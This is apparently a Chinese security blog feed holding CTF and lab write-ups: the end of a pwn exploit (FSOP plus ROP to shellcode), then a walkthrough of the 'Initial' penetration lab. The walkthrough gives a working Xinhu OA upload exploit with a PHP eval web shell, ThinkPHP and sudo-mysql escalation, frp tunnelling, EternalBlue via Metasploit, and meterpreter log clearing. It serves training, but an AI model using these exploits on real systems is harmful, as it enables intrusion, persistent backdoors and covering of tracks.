class="number">0x28</span>: libc_base+libc.symbols[<span class="string">&quot;environ&quot;</span>] + <span class="number">8</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x100</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">1</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>], <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload = fake_io_write.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x500</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: heap_base + <span class="number">0x5000</span> + <span class="number">0x200</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_io_read.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg(<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">target = stack - <span class="number">720</span></span><br><span class="line">lg(<span class="string">&#x27;target&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_read = flat(&#123;</span><br><span class="line">    <span class="number">0x00</span>: <span class="number">0x8000</span> | <span class="number">0x40</span> | <span class="number">0x1000</span>, <span class="comment">#_flags</span></span><br><span class="line">    <span class="number">0x20</span>: target, <span class="comment">#_IO_write_base</span></span><br><span class="line">    <span class="number">0x28</span>: target + <span class="number">0x200</span>, <span class="comment">#_IO_write_ptr</span></span><br><span class="line">    <span class="number">0x68</span>: <span class="number">0</span>, <span class="comment">#_chain</span></span><br><span class="line">    <span class="number">0x70</span>: <span class="number">0</span>, <span class="comment"># _fileno</span></span><br><span class="line">    <span class="number">0xc0</span>: <span class="number">0</span>, <span class="comment">#_modes</span></span><br><span class="line">    <span class="number">0xd8</span>: libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>] - <span class="number">0x8</span>, <span class="comment">#_vtables</span></span><br><span class="line">&#125;, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(fake_io_read)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000166262</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x0000000000099a83</span></span><br><span class="line">pop_rbp_ret = libc_base + <span class="number">0x0000000000023a60</span></span><br><span class="line"></span><br><span class="line">shellcode_addr = heap_base + <span class="number">0x7b0</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    pop_rdi_ret, heap_base,</span><br><span class="line">    pop_rsi_ret, <span class="number">0x2000</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">7</span>,</span><br><span class="line">    mprotect, </span><br><span class="line">    pop_rbp_ret, heap_base + <span class="number">0x3000</span>,</span><br><span class="line">    pop_rax_call_rax, shellcode_addr</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行后即可稳定拿 <code>shell</code>，效果如下：</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/12.png" class="" title="我的图图呢">  <p>可是这个 <code>shell</code> 并不能使用 <code>ls、cat</code> 这些指令，只能使用 <code>cd、pwd、echo</code> 这种比较基本的，而且 <code>echo</code> 的功能还不全，下面给出一些可以用来平替的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat flag</span></span><br><span class="line"><span class="keyword">while</span> IFS = <span class="built_in">read</span> -r line; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$line</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span> &lt; flag</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202024%20pwn%20writeup/13.png" class="" title="我的图图呢">  <p>那为什么 <code>ls、cat</code> 等指令无法使用呢？这里以 <code>ls</code> 为例解释一下：<br>ls命令的实现可以分为以下几个步骤：  </p><ol><li><p>打开目录：首先，需要打开要列出文件的目录。可以使用 <code>open()</code> 系统调用来打开目录，并获得一个目录文件描述符。  </p></li><li><p>读取目录项：通过 <code>readdir()</code> 系统调用，可以从打开的目录中读取目录项。<code>readdir()</code> 会返回一个指向目录项结构体的指针。通过循环调用 <code>readdir()</code>，可以逐个读取目录中的文件。  </p></li><li><p>过滤隐藏文件：在读取目录项之后，需要对目录项进行过滤。Linux中的隐藏文件以.开头，可以通过判断目录项的名字的第一个字符是否为.来过滤隐藏文件。  </p></li><li><p>输出目录项信息：读取到一个目录项之后，可以通过目录项结构体中的字段获取文件的属性信息，比如文件名、大小、修改时间等。可以使用 <code>printf()</code> 函数将这些信息输出到终端。  </p></li><li><p>关闭目录：使用 <code>closedir()</code> 系统调用来关闭打开的目录，释放资源。</p></li></ol><p>可以看到执行 <code>ls</code> 命令需要使用 <code>open</code> 系统调用，可是我们拿到的 <code>shell</code> 依然处于沙箱的环境中，<code>open</code> 系统调用给禁止使用，这也意味着我们无法使用 <code>ls</code> 命令</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house of water &amp; TFCCTF 2024 MCGUAVA</title>
      <link href="/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/"/>
      <url>/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="794640708d02587468f08e4df12573c62d0369e1f8f616206caf9fcc7ddde660"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境Initial详解</title>
      <link href="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/"/>
      <url>/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/1.png" class="" title="我的图图呢">  <h1 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h1><p>一直都知道渗透在网络安全中的重要性，可是一直都没用重视，于是在国赛决赛吃大亏。平时自己也在打打 <code>vulnhub</code>，但打的都是一些十分简单的靶场。国赛决赛结束后我就开始push校队的人去学习渗透，当然我这个新上任的队长肯定要起到带头作用，所以我也开始去练习春秋云境的靶场。很多人认为云境这个靶场比较贵，但是我认为能够用钱买知识是一件很划算的事情，而且春秋云境的靶场质量也比较高（还有国赛渗透也有很多内容来自这里面）<br>这篇文章是关于 <code>Initial</code> 这个靶机的详细讲解，这个是云境中最简单的一题，同时也是我打的第一个关于 <code>windows</code> 渗透的题目，因此学到了很多的东西。</p><h1 id="详细讲解"><a href="#详细讲解" class="headerlink" title="详细讲解"></a>详细讲解</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>题目给出了一个ip地址 <code>39.99.255.153</code>，我们可以使用 <code>nmap</code> 来看看他开启了那些端口，命令为：  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 39.99.255.153</span><br></pre></td></tr></table></figure><p>这段命令是以最小速率 <code>10000</code> 对全部端口（1-65535）进行扫描，<code>10000</code> 是权衡的结果，数字过大扫描速度快，但容易遗漏端口，数字过小则扫描时间过长，经验表明 <code>10000</code> 就是扫描的合适速度。<code>-p</code> 是端口参数，<code>-p-</code> 表示对所有端口进行扫描。扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/2.png" class="" title="我的图图呢">  <p>可以看到开启了 <code>22</code>、<code>80</code> 端口，<code>22</code> 端口是一个 <code>ssh</code> 服务，<code>80</code> 端口是一个 <code>http</code> 服务，接下来我们可以查看这个几个端口开启的服务和操作系统版本，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –sT –sV -O –p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>其中 <code>-sT</code> 表示进行 <code>TCP</code> 扫描（三次握手），<code>-p</code> 表示待扫描的端口（后跟待扫描的端口 <code>22</code>、<code>80</code>），<code>-sV</code> 表示探测开放服务的版本，<code>-O</code> 表示探测操作系统版本，扫描结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/3.png" class="" title="我的图图呢">  <p>可以看到这个ip是一台 <code>ubuntu linux</code> 服务器，好像也没有什么有用的信息，想到还有一个非常好用的扫描工具 <code>fscan</code>，工具的下载地址为：<br><a href="https://github.com/shadow1ng/fscan">shadow1ng&#x2F;fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a><br>这个工具有linux和windows版本，其具体用法可以看官方的文档，这里只用于进行简单的端口扫描，输入：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fscan <span class="literal">-h</span> <span class="number">39.99</span>.<span class="number">255.153</span></span><br></pre></td></tr></table></figure><p>结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/4.png" class="" title="我的图图呢">  <p>可以看到 <code>web server</code> 的版本是 <code>ThinkPHP 5.0.23</code>，而且存在漏洞！！！<br>当然也可以使用<code>nmap</code>命令来进行漏洞扫描，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p22,80 39.99.255.153</span><br></pre></td></tr></table></figure><p>这里使用 <code>ThinkphpGUI</code> 这个开源工具来进行扫一下，工具链接为：<br><a href="https://github.com/Lotus6/ThinkphpGUI">Lotus6&#x2F;ThinkphpGUI: Thinkphp(GUI)漏洞利用工具，支持各版本TP漏洞检测，命令执行，getshell。 (github.com)</a><br>输入 <code>url</code> 和选择版本后点击检测和 <code>GetShell</code> 即可，结果如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/5.png" class="" title="我的图图呢">  <p>可以到网页存在一个后门，还有一个漏洞利用的 <code>poc</code>，我们利用他给的 <code>poc</code> 来写入 <code>shell.php</code> 后门</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/6.png" class="" title="我的图图呢">  <p>好像也没有什么回显，于是我们直接使用蚁剑来连他自带的后门：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/7.png" class="" title="我的图图呢">  <img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/8.png" class="" title="我的图图呢">  <p>成功连接，而且我们能看见当前目录下有一个 <code>shell.php</code> 文件</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/9.png" class="" title="我的图图呢">  <p>点开可以发现其就是我们利用 <code>poc</code> 上传的后门，不过问题不大，能进来就行，接下来就是需要提取，我们先看一下自己是什么权限：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/10.png" class="" title="我的图图呢">  <p>可以看见是 <code>www-data</code> 权限，可是输入 <code>sudo -l</code> 时回显</p><blockquote><p>(root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;mysql</p></blockquote><p>这说明我们可以通过通过 <code>sudo</code> 高权限运行 <code>mysql</code>，进而能够执行 <code>root</code>权 限才能执行的命令，可以参考下面这篇文章，里面也有讲很多种提取的方法<br><a href="https://blog.csdn.net/Bossfrank/article/details/132035121">渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客</a></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/11.png" class="" title="我的图图呢">  <p>于是我们就能很容易的获取到 <code>flag1</code>，可以发现 <code>flag1</code> 在 <code>/root/flag</code> 目录下</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/12.png" class="" title="我的图图呢">  <h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>接下来就是要考虑内网横向移动，我们的最终目的是获取域控上的 <code>flag</code>，我们先用蚁剑上传 <code>fscan</code>，扫描一下内网中有那些存活机器</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/13.png" class="" title="我的图图呢">  <p>这里要记得给 <code>fscan</code> 执行权限，否则会执行不了<br>通过 <code>ip a</code> 我们可以发现网段为 <code>172.22.1.0/24</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/14.png" class="" title="我的图图呢">  <p>扫描的结果会自动存在当前目录的 <code>result.txt</code> 文件上</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/15.png" class="" title="我的图图呢">  <p>于是我们搜集到如下信息：</p><blockquote><p>172.22.1.2:DC域控<br>172.22.1.21:Windows的机器并且存在MS17-010 漏洞<br>172.22.1.18:信呼OA办公系统</p></blockquote><p>而我们的最终目标即为 <code>DC</code> 域控<br>我们搜先是对 <code>OA</code> 办公系统进行攻击，在这之前我们要先进行内网穿透，其目的是使我们能够在攻击机访问内网的服务，这里我们需要一台 <code>vps</code> 和工具 <code>frp</code>，学过web的师傅都知道 <code>vps</code> 是什么，这里就不做解释，<code>frp</code> 的相关知识也请读者自行学习，这里只做简单的介绍。<code>frp</code>的下载地址为，有linux和windows版本：<br><a href="https://github.com/fatedier/frp">fatedier&#x2F;frp: A fast reverse proxy to help you expose a local server behind a NAT or firewall to the internet. (github.com)</a><br>该工具的目录如下：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/16.png" class="" title="我的图图呢">  <p>其中 <code>frpc</code> 和 <code>frps</code> 是可执行文件，我们需要将 <code>frps</code> 和 <code>frps.ini</code> 上传到我们的 <code>vps</code>，<code>frpc</code><br>和 <code>frpc.ini</code> 上传到我们的靶机<br>下面是我相关文件的配置<br>frpc.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">server_addr = 120.46.199.181 # 我vps的ip地址</span><br><span class="line">server_port = 7000  </span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type = tcp   </span><br><span class="line">plugin = socks5  </span><br><span class="line">remote_port = 798</span><br></pre></td></tr></table></figure><p>frps.ini：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure><p>这里要确保你的 <code>vps</code> 开启了 <code>7000</code> 和 <code>798</code> 端口<br>然后在靶机执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure><p>在 <code>vps</code> 执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure><p>最后在攻击机你自己的电脑上（<code>windows</code>，不是 <code>kali</code>，<code>kali</code> 的配置方法在后面有讲）使用 <code>Proxy Servers</code> 配置 <code>socks5</code> 代理即可</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/17.png" class="" title="我的图图呢">  <p>其原理我不懂，学院到现在还没有教计算机网络，加上我一个纯pwn手也没去研究这种东西（其实是我懒），请师傅们轻点骂 :-(<br>最后还要在 <code>Proxy Servers</code> 上配置一下 <code>Proxificantion Rule</code>，吧除了刚配置的那一项以外的全部勾勾去掉，不然还是会访问不了，原理还是不知道🤔<br>配置完后就能直接在浏览器中输入 <code>172.22.1.18</code> 进行访问了，可以看到该系统的版本是 <code>2.2.8</code> （这个是重点，可以通过搜索系统的版本号看看有没有已经给发现的漏洞）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/18.png" class="" title="我的图图呢">  <p>这里存在一个弱口令，admin&#x2F;admin123。</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/19.png" class="" title="我的图图呢">  <p>登录后就是 <code>web</code> 手的事情了，这个系统存在文件上传漏洞，有直接的 <code>poc</code>，这里我直接参考：<br><a href="https://blog.csdn.net/solitudi/article/details/118675321">[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客</a><br>exp.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">url_pre = <span class="string">&#x27;http://url/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line"></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;dGVzdA::&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWJjMTIz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = session.post(url1, data=data1)</span><br><span class="line">r = session.post(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line"></span><br><span class="line">filepath = <span class="built_in">str</span>(r.json()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.split(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line"><span class="built_in">id</span> = r.json()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line">url3 = url_pre + <span class="string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">r = session.get(url3)</span><br><span class="line">r = session.get(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;whoami&#x27;);&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>相同目录下还有一个 <code>1.php</code> 文件存的是一句话木马<br>1.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;1&quot;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行后可以看到文件上传的路径：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/20.png" class="" title="我的图图呢">  <p>然后直接蚁剑连接：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/21.png" class="" title="我的图图呢">  <p>连接成功：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/22.png" class="" title="我的图图呢">  <p>可以看到已经拥有了 <code>system</code> 权限，我们直接在 <code>Administrator</code> 用户的目录下找到 <code>flag2</code></p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/23.png" class="" title="我的图图呢">  <h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>接下来我们就对 <code>ip 172.22.1.21</code> 进行渗透，这里需要用到渗透框架 <code>Metasploit Framework</code>，<code>kali</code> 自带这个框架，这里的攻击机我选用 <code>kali</code>（windows也可以安装Metasploit Framework，不过上面我说过也要讲讲如何在kali设置代理）。我们首先要在 <code>kali</code> 中设置 <code>socks5</code> 代理，否则我们无法访问其内网的环境。<br>在 <code>kali</code> 中设置代理比 <code>windows</code> 简单很多，他自带了一个 <code>proxychains4</code> 工具，我们只需要编辑 <code>etc</code> 目录下的 <code>proxychians4.conf</code> 文件：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/24.png" class="" title="我的图图呢">  <p>在最下面的 <code>ProxyList</code> 上加上 <code>socks5 vps ip 端口</code> 即可  </p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/25.png" class="" title="我的图图呢">  <p>然后就能在浏览器中访问靶机内网的 <code>172.22.1.*</code> 那三台机器了<br>在上面用 <code>fscan</code> 的扫描中我们发现该机子存在 <code>MS17-010</code> 漏洞，这个就是大名鼎鼎的永恒之蓝漏洞<br>我们先在 <code>kali</code> 输入 <code>msfconsole</code> 启动 <code>Metasploit Framework</code> （后面简称 <code>msf</code>）</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/26.png" class="" title="我的图图呢">  <p>可以看见界面十分的酷炫，而且每次启动 <code>msf</code> 时这个图片都会不一样<br>输入 <code>search ms17-010</code> 搜索 <code>ms17-010</code> 相关模块，可以看到一共找到了 <code>4</code> 个不同的模块：</p><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/27.png" class="" title="我的图图呢">  <p>这里我们选择使用第一个模块，因为他影响是版本比较多，然后接下来依次输入以下命令来发起永恒之蓝攻击：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue  <span class="comment"># 选择使用的模块</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid  <span class="comment"># 设置payload，可以通过show payloads查看</span></span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.1.21  <span class="comment"># 设置靶机的ip</span></span><br><span class="line">exploit  <span class="comment"># 发起攻击</span></span><br></pre></td></tr></table></figure><img src="/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/28.png" class="" title="我的图图呢">  <p>运行成功会出现meterpreter&gt;<br>该 <code>Meterpreter</code> 是 <code>metasploit</code> 的一个扩展模块，可以调用 <code>metasploit</code> 的一些功能，对目标系统进行更深入的渗透，入获取屏幕、上传&#x2F;下载文件、创建持久后门等。<br>下面介绍一些该模块常用的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot <span class="comment"># 捕获屏幕</span></span><br><span class="line">meterpreter &gt; upload hello.txt c:// <span class="comment">#上传文件</span></span><br><span class="line">meterpreter &gt; download d://1.txt <span class="comment"># 下载文件</span></span><br><span class="line">meterpreter &gt; shell <span class="comment"># 获取cmd</span></span><br><span class="line">meterpreter &gt; clearev <span class="comment"># 清除日志</span></span><br></pre></td></tr></table></figure><p>紧接着上图，可以发现我们已经成功的打进该主机，遗憾的是该机子上并没有 <code>flag</code>  ，也就是说我们最后的<code>flag</code> 在 <code>windows DC</code> 域控制器上面<br>接下来是进行 <code>DCSync</code> 攻击，这里简单解释一下：<br>首先，什么是 